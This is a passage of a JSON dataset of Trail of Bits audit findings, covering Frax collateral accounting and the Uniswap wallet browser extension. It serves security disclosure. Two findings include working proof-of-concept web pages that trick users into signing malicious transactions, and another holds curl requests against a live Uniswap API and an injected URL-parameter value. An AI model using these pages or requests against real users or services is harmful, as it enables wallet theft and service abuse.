the $1 default value, and the protocol needs to respond to the insucient collateral backing FRAX. Recommendations Short term, integrate the Uniswap V3 AMOs properly with an oracle, and remove the hard-coded price assumptions. Long term, review and test the eect of each pricing function on the global collateral value and ensure that the protocol responds correctly to changes in collateralization. 18. calc_withdraw_one_coin is vulnerable to manipulation Severity: High Diculty: High Type: Data Validation Finding ID: TOB-FRSOL-018 Target: MIM_Convex_AMO.sol",
        "labels": [
            "Trail of Bits",
            "Severity: Medium",
            "Difficulty: Medium"
        ]
    },
    {
        "title": "25. Setting collateral values manually is error-prone ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/FraxQ42021.pdf",
        "body": "During the audit, the Frax Solidity team indicated that collateral located on non-mainnet chains is included in FRAX.globalCollateralValue in FRAXStablecoin , the Ethereum mainnet contract . (As indicated in TOB-FRSOL-023 , this collateral cannot currently be redeemed by users.) Using a script, the team aggregates collateral prices from across multiple chains and contracts and then posts that data to ManualTokenTrackerAMO by calling setDollarBalances . Since we did not have the opportunity to review the script and these contracts were out of scope, we cannot speak to the security of this area of the system. Other issues with collateral accounting and pricing indicate that this process needs review. Furthermore, considering the following issues, this privileged role and architecture signicantly increases the attack surface of the protocol and the likelihood of a hazard:     The correctness of the script used to calculate the data has not been reviewed, and users cannot audit or verify this data for themselves. The conguration of the Frax Protocol is highly complex, and we are not aware of how these interactions are tracked. It is possible that collateral can be mistakenly counted more than once or not at all. The reliability of the script and the frequency with which it is run is unknown. In times of market volatility, it is not clear whether the script will function as anticipated and be able to post updates to the mainnet. This role is not explained in the documentation or contracts, and it is not clear what guarantees users have regarding the collateralization of FRAX (i.e., what is included and updated). As of December 20, 2021, collatDollarBalance has not been updated since November 13, 2021 , and is equivalent to fraxDollarBalanceStored . This indicates that FRAX.globalCollateralValue is both out of date and incorrectly counts FRAX as collateral (see TOB-FRSOL-024 ). Recommendations Short term, include only collateral that can be valued natively on the Ethereum mainnet and do not include collateral that cannot be redeemed in FRAX.globalCollateralValue . Long term, document and follow rigorous processes that limit risk and provide condence to users. A. Vulnerability Categories The following tables describe the vulnerability categories, severity levels, and diculty levels used in this document. Vulnerability Categories Category",
        "labels": [
            "Trail of Bits",
            "Severity: High",
            "Difficulty: Low"
        ]
    },
    {
        "title": "1. Sidebar approval screen may be suddenly switched ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2024-02-uniswap-wallet-browserextension-securityreview.pdf",
        "body": "The Uniswap wallet browser extension sidebar (Chrome sidePanel component) is global (i.e., shared between all tabs in a browser window). The sidebar displays layers with conrmation buttons for users' actions, where the actions are triggered via requests to the JavaScript Ethereum API. The layers are stacked on top of each othera layer for the newest request is put on top of old layers. Because of these facts, a malicious website running in one tab can unexpectedly overlay a conrmation button (originating from an honest website) in another tab. pending: [], // ordered array with the most recent request at the end Figure 1.1: Ordered array for the layers (universe/apps/stretch/src/background/features/dappRequests/slice.ts#8) // Show only the last request const pendingRequests = useAppSelector((state) => state.dappRequests.pending) const request = pendingRequests[pendingRequests.length - 1] Figure 1.2: The DappRequestContent function displays the most recent request. (universe/apps/stretch/src/background/features/dappRequests/DappRequestCo ntent.tsx#5658) The vulnerability is hard to exploit because its timing must be precisely measured or guessed. On the other hand, the vulnerability also increases the chances of a more standard phishing attack because it allows malicious websites to open the wallet when the user is navigating on a completely dierent webpage. Exploit Scenario Alice has opened two dapp websites, one malicious and one honest, in two tabs. She connects both dapps to the Uniswap wallet browser extension. Alice goes to the honest dapp and creates a blockchain transaction. The honest dapp uses the Ethereum API to display the sidebar. The sidebar displays transaction details and asks for conrmation. Alice reviews the details and clicks the conrmation button. However, just before Alice clicks the button, the malicious website makes a request to the Ethereum API. The request causes a new layer to be displayed in the sidebara layer with a button conrming a new, malicious transaction. Alice unwillingly signs the transaction from the malicious dapp. A malicious website could host code similar to that in gure 1.3. <!DOCTYPE html> <html> <head> <meta charset=\"utf-8\"> <meta name=\"viewport\" content=\"width=device-width, initial-scale=1\"> <title>Uniswap exptension - TOB-UNIEXT-1</title> </head> <body> <script type=\"text/javascript\"> let provider = null; async function poc() { try { console.log('Start TOB-UNIEXT-1 PoC'); console.log(provider); await new Promise(r => setTimeout(r, 4000)); // wait let addr = await provider.enable(); console.log(addr); } catch (err) { console.error(err); } } document.addEventListener(\"visibilitychange\", (event) => { if (document.visibilityState != \"visible\") { console.log(\"User changed tab\"); (async () => { try { await poc(); } catch(err) { console.error(err); } })() } }); const initialize = async () => { window.addEventListener('eip6963:announceProvider', (event) => { provider = event.detail.provider; }); window.dispatchEvent(new Event('eip6963:requestProvider')); }; window.addEventListener('load', initialize); </script> </body> </html> Figure 1.3: An example malicious website that switches the sidebar conrmation button 4 seconds after the button is clicked Recommendations Short term, have the sidebar push new requests (layers) to the bottom of the stack instead of showing them on top of previous requests. Allow users to switch between old and new requests. Also, add the number of requests to be acknowledged (i.e., the number of layers) in the UIfor example, 1 of 9 requests waiting to be acknowledged. Make the sidebar enable the conrmation button a few seconds after it is opened so that users will not accidentally click it. Make the sidePanel tab-specic instead of global by removing the default_path eld from the manifest.json le and explicitly setting the path option before opening the sidePanel. A tab-specic sidePanel means a new instance of the panel is created for the tab. Not sharing the state between tabs will help avoid race conditions, data exposure, and user interfacerelated vulnerabilities on the architecture level. Either of the two proposed changes requires a signicant redesign of the React application architecture and will impact the functionality (i.e., the sidePanel will not be kept open when a user changes tabs). Consider making the injected Ethereum API (content script) respond only to actions triggered by a users gesturethat is, accept requests to the API only if they originate from a direct user action like a button click. This can be done in a variety of ways:  In the content script  Checking the navigator.userActivation.isActive ag  Listening to the visibilitychange event  In the background component  Always opening the sidePanel before processing the requests from the content script and doing so outside of a try-catch block (a sidePanel can be opened programmatically only on user interaction)  Consulting the isTrusted property of an event This recommendation will make exploitation of various vulnerabilities harder. However, it may limit the functionality of dapps that need to interact with a wallet without user interaction. The EIP-6963 and EIP-1193 standards do not specify that the Ethereum API should be triggered only on user interaction. On the other hand, MetaMask advises dapp developers to initiate a connection to a wallet only on user interaction. A compromise between usability and security may be to limit only some Ethereum APIs (e.g., the enable method and the eth_requestAccounts request). Long term, design the UI so that dialog boxes do not unexpectedly show up, elements do not move around without user interaction, and windows do not gain focus in unexpected moments. Sudden interface changes could lead users to perform actions other than those intended. This issue impacts the user experience and may have security consequences. References  Missile Warning System meme (based on the 2018 Hawaii false missile alert)",
        "labels": [
            "Trail of Bits",
            "Severity: Medium",
            "Difficulty: High"
        ]
    },
    {
        "title": "2. No password policy enforcement when changing the wallets password ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2024-02-uniswap-wallet-browserextension-securityreview.pdf",
        "body": "The Uniswap wallet browser extension correctly enforces a password policy when initializing a wallet. However, the password change functionality does not enforce any password policy (gure 2.1). Figure 2.1: Change password functionality with a password set to 1. Exploit Scenario A user changes his wallets password to 123. He uses this low-complexity password to authenticate to his wallet repeatedly. An attacker standing next to his computer sees the password provided by the user. The user leaves his laptop for a minute, and the attacker quickly steals funds. Recommendations Short term, enforce the same password policy in the change password functionality.",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: High"
        ]
    },
    {
        "title": "3. Race condition with tab IDs in the background component ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2024-02-uniswap-wallet-browserextension-securityreview.pdf",
        "body": "The background component asynchronously processes requests from the injected JavaScript Ethereum API (the extensions content script). The background receives a windows tab ID along with the request, then pulls dapp information (e.g., the URL) using the previously provided tab ID. A malicious dapp can send a request and immediately change its tabs information (e.g., by changing the URL location). This means there is a time-of-check time-of-use (TOCTOU) vulnerability in the background component. The background component handles requests from the Ethereum API in the initMessageBridge method, which stores the request together with the tab ID (gure 3.1) as an addRequest action. if (requiresApproval(request)) { await openSidebar(sender.tab?.id, sender.tab?.windowId || 0) } // Dispatches a saga action which will handle side effects as well store?.dispatch( addRequest({ dappRequest: request, senderTabId: sender.tab?.id || 0, }) ) Figure 3.1: Storing request and tab ID in the background component (universe/apps/stretch/src/background/index.ts#228238) The addRequest actions are processed by the dappRequestWatcher method (gure 3.2), which calls the handleRequest function (gure 3.3). export function* dappRequestWatcher() { while (true) { const { payload, type } = yield* take(addRequest) if (type === addRequest.type) { yield* call(handleRequest, payload) } } } Figure 3.2: Code processing the previously stored requests (universe/apps/stretch/ src/background/features/dappRequests/saga.ts#8088) The handleRequest function calls the Chrome API to get the tabs URL, given the tabs ID, and the URL is used to nd information about a dapp. const tab = yield* call(chrome.tabs.get, requestParams.senderTabId) const dappUrl = extractBaseUrl(tab.url) const dappInfo = yield* select(selectDappInfo(dappUrl)) const isConnectedToDapp = dappInfo && dappInfo.connectedAccounts?.length > 0 Figure 3.3: The rst TOCTOU entry point in the handleRequest function (universe/apps/ stretch/src/background/features/dappRequests/saga.ts#111115) The dapp information is then used for basic authentication and saved with the request in the extensions global statein the pending array (gure 3.4). add: (state, action: PayloadAction<DappRequestStoreItem>) => { // According to EIP-1193 when switching the active chain, cancel all pending RPC requests and chain-specific user confirmations. if (action.payload.dappRequest.type === DappRequestType.ChangeChain) { state.pending = [action.payload] } else { state.pending.push(action.payload) } }, Figure 3.4: The method saving requests in the extensions global state (universe/apps/ stretch/src/background/features/dappRequests/slice.ts#2128) The DappRequestContent function pulls data from the pending array (gure 3.5) and calls the Chrome API again to display the dapp information in the sidePanel (gure 3.6). const pendingRequests = useAppSelector((state) => state.dappRequests.pending) const request = pendingRequests[pendingRequests.length - 1] Figure 3.5: Pulling from the extensions global state (universe/apps/stretch/src/ background/features/dappRequests/DappRequestContent.tsx#5758) useEffect(() => { chrome.tabs.get(request.senderTabId, (tab) => { const newUrl = extractBaseUrl(tab.url) || '' setDappUrl(newUrl) setDappName(newUrl.endsWith('.uniswap.org') ? 'Uniswap' : tab.title || '') setDappIconUrl(tab.favIconUrl || '') }) }, [request.senderTabId]) Figure 3.6: The second TOCTOU entry point in the DappRequestContent function (universe/apps/stretch/src/background/features/dappRequests/DappRequestCo ntent.tsx#6875) In addition to the two TOCTOU entry points, there are a few more entry points that may be exploited similarly:  The entry point in the changeChain function (gure 3.7) can be used to change the chain ID assigned to a dapp. export function* changeChain({ dappRequest, senderTabId }: DappRequestStoreItem) { const updatedChainId = (dappRequest as ChangeChainRequest).chainId const provider = yield* call(getProvider, updatedChainId) const tab = yield* call(chrome.tabs.get, senderTabId) Figure 3.7: The TOCTOU entry point in the changeChain function (universe/apps/ stretch/src/background/features/dappRequests/saga.ts#304307)  The attack vector for the entry point in the getAccountRequest function (gure 3.8) is undetermined. export function* getAccountRequest({ dappRequest, senderTabId }: DappRequestNoDappInfo) { const activeAccount = yield* appSelect(selectActiveAccount) const tab = yield* call(chrome.tabs.get, senderTabId) const dappUrl = extractBaseUrl(tab.url) Figure 3.8: The TOCTOU entry point in the getAccountRequest function (universe/apps/ stretch/src/background/features/dappRequests/saga.ts#216219)  The entry point in the sendMessageToSpecificTab function (gure 3.9) may be used to disclose data from a dapp if the dapp redirects to a malicious website or if the user manually navigates to the malicious website. chrome.tabs.sendMessage<Message>(tabId, message).catch((error) => { onError?.() logger.error(error, { tags: { file: 'messageUtils', function: 'sendMessageToSpecificTab' } }) }) Figure 3.9: The TOCTOU entry point in the sendMessageToSpecificTab function (universe/apps/stretch/src/background/utils/messageUtils.ts#4649)  The entry point in the sendMessageToActiveTab function (gure 3.10) is dierent in that the function acts on a currently active tab. To trigger the bug, it would be necessary to make an Ethereum API request (e.g., connect the wallet to a dapp) in one tab and then switch focus to another tabthe response to the request should go to the website in the second tab. export function sendMessageToActiveTab(message: Message, onError?: () => void): void { chrome.tabs.query({ active: true, currentWindow: true }, ([tab]) => { if (tab?.id) { chrome.tabs.sendMessage<Message>(tab.id, message).catch(() => { onError?.() // If no listener is listening to the message, the promise will be rejected, // so we need to catch it unless there is an explicit error handler }) } }) } Figure 3.10: The TOCTOU entry point in the sendMessageToActiveTab function (universe/apps/stretch/src/background/utils/messageUtils.ts#919) Exploit Scenario Alice connects her Uniswap wallet browser extension to a malicious website. The website triggers a request for a transaction signature via the Ethereum API and immediately redirects itself to the Uniswap website. The Uniswap extensions sidePanel displays the signature request and a conrmation button with the Uniswap information (gure 3.11). The Uniswap website did not have to be previously connected to the extension. Figure 3.11: The Uniswap information in the sidePanel Alice wrongly believes that the signature request comes from Uniswap and accepts it. She loses tokens. The malicious website could use a script similar to the one shown in gure 3.12. <!DOCTYPE html><html> <head> <meta charset=\"utf-8\"> <meta name=\"viewport\" content=\"width=device-width, initial-scale=1\"> <title>Uniswap exptension - TOB-UNIEXT-3</title> </head><body> <script type=\"text/javascript\"> const wait_time = 120; // ADJUST THAT const address = '0xCAFE21005d9D29F0C27460A8324de852b91b79b1'; // whatever const target = 'https://app.uniswap.org/swap?chain=mainnet'; let provider = null; async function poc() { try { console.log('Start TOB-UNIEXT-3 PoC'); await new Promise(r => setTimeout(r, 2000)); // for demo purposes only // move to other website window.location = target; // sleep, because location change is slow await new Promise(r => setTimeout(r, wait_time)); // to bypass content script's isAuthorized provider.publicKeys = [address]; // trigger asynchronous request ethereum.request({ method: 'personal_sign', params: ['0x414142', address], }); } catch (err) { console.error(err); } } const initialize = () => { window.addEventListener('eip6963:announceProvider', (event) => { console.log(event.detail.provider); provider = event.detail.provider; (async () => { try { await poc(); } catch(err) { console.error(err); } })() }); window.dispatchEvent(new Event('eip6963:requestProvider')); }; window.addEventListener('load', initialize); </script> </body> </html> Figure 3.12: Proof-of-concept exploit To debug the vulnerability, it is easiest to set a breakpoint in the extensions service worker (the background component). Recommendations Short term, use the URL as the only authentication data and stop using tab IDs for control ow purposes. The root cause of the vulnerability described in this nding is confusion between the two identiers: the URL and the tab ID. The fact that the sidePanel is global and not tab-specic further adds to the confusion. To start xing the issue, replace the sender.tab.id argument in the call to the addRequest method in the initMessageBridge function (gure 3.1) with sender.url or sender.originresearch which one of these two should be used. With this change, the background component will be able to uniquely determine the dapp (website) sending the request and will not have to request data from the Chrome API using tab IDs. The previous recommendation eliminates race conditions in the content script for background communication. However, communication in the other direction may also suer from race conditionsthat is, the background may asynchronously send a message to the wrong content script. To mitigate that, we recommend having the code either check the tab's URL just before sending a message (e.g., using the sendMessageToUrl method) or implementing long-lived communication channels.",
        "labels": [
            "Trail of Bits",
            "Severity: Medium",
            "Difficulty: Medium"
        ]
    },
    {
        "title": "4. The clipboard is not cleared when copying the recovery phrase ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2024-02-uniswap-wallet-browserextension-securityreview.pdf",
        "body": "When the recovery phrase is copied, the Uniswap wallet browser extension does not remove it from the clipboard after a specied thresholdfor example, one minuteas shown in gure 4.1. Clearing the clipboard is important because its contents can be accessed outside the browsers context (i.e., by other applications on the users OS). Figure 4.1: The recovery phrase view in the Uniswap wallet browser extension with the copy functionality Exploit Scenario A user copies his recovery phrase and then opens a malicious application that steals the recovery phrase from the OS clipboard, which leads to stolen funds. Recommendations Short term, modify the code to clear the clipboard from the extensions context after one or two minutes when the recovery phrase is copied.",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: High"
        ]
    },
    {
        "title": "5. Browser extension crashes when data to be signed does not follow EIP-712 standard ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2024-02-uniswap-wallet-browserextension-securityreview.pdf",
        "body": "The Uniswap wallet browser extension crashes when a data message for the user to sign in using the eth_signTypedData_v4 method does not follow the EIP-712 format. First, the browser extension crashes (gure 5.1) when the message does not contain the required TypedData parameter (gure 5.2). Figure 5.1: The Uniswap browser extension crashes when a message to be signed does not contain the required TypedData. await window.ethereum.request( { \"method\": \"eth_signTypedData_v4\", \"params\": [ \"0x0000000000000000000000000000000000000000\", ]}); Figure 5.2: An example request using the eth_signTypedData_v4 method with the message without the required TypedData The extension crashes because the SignTypedDataDetails function does not check whether the rawTypedData parameter is valid and passes the rawTypedData directly to the JSON.parse function (gure 5.3, lines 1314). 6 7 8 9 10 11 12 13 export const SignTypedDataDetails = ({ chainId, request, }: { chainId: number request: DappRequestStoreItem }): JSX.Element => { const rawTypedData = (request.dappRequest as SignTypedDataRequest).typedData 14 (...) const typedData: EthTypedMessage = JSON.parse(rawTypedData) Figure 5.3: The SignTypedDataDetails function responsible for parsing typed data (universe/apps/stretch/src/background/features/dappRequests/requestConten t/SignTypedDataContent.tsx#614) Second, the extension crashes (gure 5.6) when the message does not contain the message property (gure 5.4). The SignTypedDataDetails method passes the typedData.message property without any check to the getParsedObjectDisplay method (gure 5.5). The typedData.message becomes undened if it does not exist in the message. Then an undened typedData.message is passed to the Object.keys function in the getParsedObjectDisplay function to create an array containing all the keys of the obj object. Creating an array with the undened obj leads to a crash. await window.ethereum.request({ \"method\": \"eth_signTypedData_v4\", \"params\": [ \"0x0000000000000000000000000000000000000000\", JSON.stringify({ IamNotMessage: { content: 'Hello, world!' },})]}); Figure 5.4: An example request using the eth_signTypedData_v4 method with the message without the required message property {getParsedObjectDisplay(chainId, typedData.message)} // (...) const getParsedObjectDisplay = (chainId: number, obj: any,depth = 0): JSX.Element => { // (...) {Object.keys(obj).map((objKey) => { Figure 5.5: Part of the SignTypedDataDetails function that directly passes the typedData.message to the getParsedObjectDisplay function (universe/apps/stretch/src/background/features/dappRequests/requestConten t/SignTypedDataContent.tsx#1939) Figure 5.6: The Uniswap wallet browser extension crashes when a message to be signed does not contain the required message property. Exploit Scenario An attacker nds a way to force a user to sign a malformed message that crashes the users extension. The crash disrupts condence in the Uniswap browser extensions security. Recommendations Short term, add appropriate checks for the rawTypedData and typedData.message variables to ensure they are not null or undened. Long term, extend unit tests to cover a scenario with a malformed message to be signed. Additionally, cover the SignTypedDataDetails and getParsedObjectDisplay functions with fuzz tests.",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: Medium"
        ]
    },
    {
        "title": "6. Minimum Chrome version not enforced ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2024-02-uniswap-wallet-browserextension-securityreview.pdf",
        "body": "The manifest.json le of the Uniswap wallet browser extension does not contain a eld to enforce a minimum Chrome version. Having this eld can prevent a user from using a potentially vulnerable version because it will force the user to update before using the extension. Furthermore, service worker lifetime behaviors dier depending on the Chrome version, which could result in dierentials. Exploit Scenario A user opens the Uniswap wallet browser extension while using a vulnerable version of Chrome, which is exploited by an attacker. Recommendations Short term, choose a minimum Chrome version to support based on the desired service worker lifetime behaviors. Specify this version in the manifest.json le.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: Low"
        ]
    },
    {
        "title": "7. Data from Uniswap server is weakly validated in Scantastic protocol ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2024-02-uniswap-wallet-browserextension-securityreview.pdf",
        "body": "Data received by the Uniswap wallet browser extension from the remote Uniswap server is not validated, which allows the server to provide malicious data, forcing the extension to perform actions impacting the users security. The UUID information used to construct QR codes is especially sensitive. The UUID is received from the server and saved in local storage without any validation (gure 7.1). Later it is used to construct a QR code without URL encoding (gure 7.2) and URL addresses for HTTP requests (gure 7.3). // Initiate scantastic onboarding session const response = await fetch(`${uniswapUrls.apiBaseExtensionUrl}/scantastic/uuid`, { method: 'POST', headers: { Accept: 'application/json', }, }) // TODO(EXT-485): improve error handling if (!response.ok) { logger.error('failed to fetch uuid for mobile->ext onboarding', { {...omitted for brevity...} }) return } const data = await response.json() // TODO(EXT-485): improve error handling if (!data.uuid) { return } {...omitted for brevity...} setSessionUUID(data.uuid) sessionStorage.setItem(ONBOARDING_UUID, data.uuid) Figure 7.1: The extension receives the UUID from the server. (universe/apps/stretch/src /app/features/onboarding/scan/ScantasticContextProvider.tsx#99129) let qrURI = `scantastic://pubKey=${JSON.stringify(publicKey)}&uuid=${sessionUUID}` Figure 7.2: The extension uses the UUID to construct a QR code without encoding. (universe/apps/stretch/src/app/features/onboarding/scan/utils.ts#58) // poll OTP state const response = await fetch( `${uniswapUrls.apiBaseExtensionUrl}/scantastic/otp-state/${sessionUUID}`, { method: 'POST', headers: { Accept: 'application/json', }, } ) Figure 7.3: The extension uses the UUID to construct a URL without encoding. (universe/apps/stretch/src/app/features/onboarding/scan/ScantasticContext Provider.tsx#155164) The vulnerability has been set to only low severity because the Uniswap mobile application uses the rst pubKey parameter from the QR code, which happens to be the correct one. However, the system is secure accidentally and the vulnerability would be of high severity otherwise. export function parseScantasticParams(uri: string): ScantasticModalState { const pubKey = new URLSearchParams(uri).get('pubKey') || '' const uuid = new URLSearchParams(uri).get('uuid') || '' const vendor = new URLSearchParams(uri).get('vendor') || '' const model = new URLSearchParams(uri).get('model') || '' const browser = new URLSearchParams(uri).get('browser') || '' return { pubKey, uuid, vendor, model, browser } } Figure 7.4: The mobile application uses the rst parameter with the given key. (universe/apps/ mobile/src/components/WalletConnect/ScanSheet/util.ts#167174) Exploit Scenario Mallory takes control of the Uniswap server and modies its code. The server starts sending malicious UUIDs in response to requests to the /v2/scantastic/uuid URL. The modied responses look like the following: \"uuid\":\"a-b-c-d&pubKey={}&vendor=X\" Alice onboards her wallet from the mobile application to Uniswaps extension. She scans a QR code that contains a Scantastic URL with two pubKey and two vendor parameters. scantastic://pubKey={\"alg\":\"RSA-OAEP-256\",\"e\":\"AQAB\",\"ext\":true,\" key_ops\":[\"encrypt\"],\"kty\":\"RSA\",\"n\":\"wZVbc\"}&uuid=a-b-c-d&pubKe y={}&vendor=X&vendor=Apple&model=Macintosh&browser=Chrome The mobile application uses the rst pubKey (generated by the extension). However, the mobile application also uses the rst vendor (injected by the server). Alice manually validates the vendor, trusting it to come from the extension. She is tricked by the server. Recommendations Short term, make the extension strictly validate all data received from remote servers. At a minimum, the code shown in gure 7.1 should be xed. Make the extension encode data before using it to construct QR codes and URLs. At a minimum, the code shown in gures 7.2 and 7.3 should be xed. Ensure that data from QR codes is validated in the mobile application. If there are URLs from Scantastic QR codes, the application should verify the following:  The URL contains only a single schema separator [://].  The URL schema is equal to the scantastic string.  All keys in the URLs search parameters are unique.  The UUID from the URL has the expected syntax.  The pubKey from the URL has the expected syntax and its elds (e.g., alg and kty) have expected values.",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: Medium"
        ]
    },
    {
        "title": "8. Wallet information accessible in locked state ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2024-02-uniswap-wallet-browserextension-securityreview.pdf",
        "body": "It is possible to interact with the locked Uniswap wallet browser extension. For example, when connected to a dapp, the locked extension still allows a website to return a user's address (gure 8.1). However, during the audit, we did not nd that it was possible to send a transaction on the locked or disconnected wallet. Figure 8.1: An example interaction with the locked Uniswap wallet Exploit Scenario Bob connects the wallet with a dapp and locks the wallet. He can then see that some data is still available on the dapp, even though he locked the wallet. He compares this behavior to competitors wallets and loses condence in the Uniswap wallet browser extension. Recommendations Short term, ensure that no interaction to retrieve sensitive data (e.g., using an address to retrieve the account balance) is possible on the locked wallet. Long term, extend the testing suite to ensure the browser extension prevents any interaction in the locked state.",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: Medium"
        ]
    },
    {
        "title": "9. Scantastic server API does not strictly validate users data ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2024-02-uniswap-wallet-browserextension-securityreview.pdf",
        "body": "The data coming from the user is not validated on the Scantastic level. The resulting error sources rely on the back-end components (such as DynamoDB). This behavior can lead to unpredictable server-side problems, especially if the specics of the back-end components change in the future. For example, creating a blob longer than 409,495 characters is impossible because the blob exceeds the maximum item size supported by DynamoDB (gure 9.1). $ random_num=$(printf 'A%.0s' {1..409496}) $ curl -X POST 'https://gateway.uniswap.org/v2/scantastic/blob' \\ -H 'Host: gateway.uniswap.org' \\ -H 'Origin: chrome-extension://pamklohbhhpfgbmmkkdnfbelfgijldpe' \\ -d @- <<EOF {\"uuid\":\"d2d5cebe-d5e1-4bdf-8a4c-275341172242\",\"blob\":\"$random_num\"} EOF {\"statusCode\":500,\"errorName\":\"InternalServerError\"} Figure 9.1: Commands that send a 409,496-character-long blob to the Scantastic API It is feasible to obtain an OTP for a 409,495-character-long blob (gure 9.2), but it is impossible to retrieve the blob via the /v2/scantastic/otp API call because the server returns a 500 Internal Server Error (gure 9.3). $ random_num=$(printf 'A%.0s' {1..409495}) $ curl -X POST 'https://gateway.uniswap.org/v2/scantastic/blob' \\ -H 'Host: gateway.uniswap.org' \\ -H 'Origin: chrome-extension://pamklohbhhpfgbmmkkdnfbelfgijldpe' \\ -d @- <<EOF {\"uuid\":\"ea284e33-239e-403f-a6b2-0a93ca843942\",\"blob\":\"$random_num\"} EOF {\"otp\":\"933648\",\"expiresAtInSeconds\":1707735704} Figure 9.2: Commands that send a 409,495-character-long blob to the Scantastic API $ random_num=$(printf 'A%.0s' {1..409495}) $ curl -X POST 'https://gateway.uniswap.org/v2/scantastic/otp' \\ -H 'Host: gateway.uniswap.org' \\ -H 'Origin: chrome-extension://pamklohbhhpfgbmmkkdnfbelfgijldpe' \\ -d @- <<EOF {\"uuid\":\"ea284e33-239e-403f-a6b2-0a93ca843942\",\"otp\":\"933648\"} EOF {\"statusCode\":500,\"errorName\":\"InternalServerError\"} Figure 9.3: Commands that try to retrieve the 409,495-character-long blob Additionally, the Scantastic API does not implement the UUID validation. The resulting internal server error (gure 9.4) occurs because DynamoDB does not consider the empty string a valid value for a primary key attribute. POST /v2/scantastic/blob HTTP/2 Host: gateway.uniswap.org Origin: chrome-extension://pamklohbhhpfgbmmkkdnfbelfgijldpe Content-Length: 24 {\"uuid\":\"\",\"blob\":\"abc\"} HTTP/2 500 Internal Server Error Date: Mon, 12 Feb 2024 11:08:13 GMT Content-Type: application/json Content-Length: 52 (...) {\"statusCode\":500,\"errorName\":\"InternalServerError\"} Figure 9.4: An HTTP request-and-response cycle that sends a blob with an empty UUID Recommendations Short term, implement strict validation of user-supplied data in the Scantastic API. Long term, periodically scan the Scantastic API dynamically to identify any edge-case scenarios unhandled by the application.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: High"
        ]
    },
    {
        "title": "10. Extensions content script is injected into les ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2024-02-uniswap-wallet-browserextension-securityreview.pdf",
        "body": "The Uniswap wallet browser extension species the content_scripts.matches eld as the <all_urls> pattern. Therefore, the injected.js le is injected into both HTTP websites and local les opened with a browser. This behavior unnecessarily increases the attack surface. Moreover, opening the wallet in a local HTML le makes the wallet display only the file:// schema and not the lename or le path. If the content_scripts.matches eld is to be kept as it is, then this issue must be xed. Figure 10.1: Uniswap wallet browser extension does not display lename. Exploit Scenario Alice downloads a malicious HTTP le and opens it in a browser. The le exploits vulnerabilities in the Uniswap browser extension using the injected content script. Recommendations Short term, set the content_scripts.matches eld to https://*/. This will limit content script injections to websites only.",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: High"
        ]
    },
    {
        "title": "11. Messages with non-printable characters are displayed incorrectly in personal_sign request ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2024-02-uniswap-wallet-browserextension-securityreview.pdf",
        "body": "The Uniswap wallet browser extension opens a pop-up dialog box when a dapp requests a signature using the JavaScript Ethereum API. The dialog box displays a message to be signed to a user. The message is shown as UTF-8 text. If the message contains non-printable or binary characters, the characters are displayed as whitespaces (gure 11.1). Figure 11.1: Message 0x410a0d0b0c20420043 as presented to the user const request: SignMessageRequest = { type: DappRequestType.SignMessage, requestId: uuidv4(), messageHex: ethers.utils.toUtf8String(messageHex), } Figure 11.2: Message converted from hex to UTF-8 in the handleEthSignMessage method (universe/apps/stretch/src/contentScript/InjectedProvider.ts#348352) Exploit Scenario A malicious dapp requests a user to sign a specially crafted message that contains a combination of UTF-8 and non-printable characters. It is displayed by the browser extension in a way that masks the true content of the message. The user signs a dierent message than they see on the screen. Recommendations Short term, have the code detect non-printable characters and display messages containing such characters with hex encoding. Alternatively, reject such messages. Consider always displaying a message in two ways: as plaintext and in hex encoding. Additionally, consider warning users about messages containing non-printable characters, as these may be misleading during manual, human verication. Unfortunately, the personal_sign method is underspecied and various wallets handle messages in dierent ways.",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: Medium"
        ]
    },
    {
        "title": "12. Ethereum API signing methods do not validate all arguments ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2024-02-uniswap-wallet-browserextension-securityreview.pdf",
        "body": "The Uniswap wallet browser extension does not validate some arguments when handling the personal_sign and eth_signTypedData_v4 methods of the Ethereum API. The personal_sign method (implemented in the handleEthSignMessage function) and the eth_signTypedData_v4 method (implemented in the handleEthSignTypedData function) take two arguments: the message to sign and the signers address. The Uniswap extension ignores the address argument. This issue may cause dapps to behave incorrectly. The eth_signTypedData_v4 method species a chain ID that should be validated against the chain ID active in the wallet, but it is not. Exploit Scenario Alice connects a dapp to her Uniswap wallet browser extension with address X. The dapp requests a signature with the personal_sign or eth_signTypedData_v4 method for address Y. Alice signs with a dierent address than the dapp requested. The dapp is confused. Recommendations Short term, make the handleEthSignMessage function check the address argument. If the address is dierent from the connected wallet address, the function should either reject the request as unauthorized or ask the user to change wallets. The address should be checked in the background component, not in the content script.",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: Medium"
        ]
    },
    {
        "title": "13. Not all data is displayed to users for manual validation ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2024-02-uniswap-wallet-browserextension-securityreview.pdf",
